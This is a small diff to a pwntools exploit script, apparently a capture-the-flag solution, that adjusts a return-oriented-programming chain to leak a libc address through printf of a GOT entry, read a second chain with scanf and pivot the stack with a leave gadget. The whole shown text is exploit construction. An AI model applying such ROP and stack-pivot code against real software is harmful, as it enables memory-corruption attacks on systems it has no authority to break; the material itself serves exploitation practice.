@@ -63,11 +63,12 @@ pr(n)
 #make rop chain to leak libc, scanf second rop chain, then pivot stack to second rop chain
 
 rop = ROP(e)
+rop.raw(arr + 0x1000 - 0x8) #pop'd rbp value
 rop.printf(arr + 0x4 * (n - 1), printf_got)
 rop.call(scanf_plt, [arr + 0x4 * (n - 1), arr + 0x1000])
-rop.call(rop.leave.address)
+rop.call(rop.leave.address) #pivot to rbp
 
-a = [arr + 0x1000 - 0x8] + rop.build()
+a = rop.build()
 
 for i in range(len(a)):
     if type(a[i]) is bytes:
